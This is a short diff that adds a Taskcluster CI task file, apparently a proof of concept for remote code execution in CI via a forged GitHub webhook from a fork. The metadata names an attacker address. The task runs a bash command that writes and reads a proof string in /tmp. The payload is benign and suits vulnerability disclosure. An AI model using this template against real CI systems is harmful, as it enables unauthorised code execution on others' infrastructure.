@@ -1,1 +1,21 @@
-marker: FORK-NO-PR
+version: 1
+policy:
+  pullRequests: collaborators
+tasks:
+  - $if: 'tasks_for == "github-push"'
+    then:
+      provisionerId: docker-compose
+      workerType: generic-worker
+      deadline: {$fromNow: '1 hour'}
+      expires: {$fromNow: '1 day'}
+      metadata:
+        name: REAL-GITHUB-PROOF
+        description: fetched from a fork via a forged webhook
+        owner: attacker@example.com
+        source: 'https://github.com/ndt4m/tc-sha-test'
+      payload:
+        maxRunTime: 300
+        command:
+          - - /bin/bash
+            - -c
+            - "echo RCE_VIA_REAL_GITHUB_FORK > /tmp/real_proof; cat /tmp/real_proof"
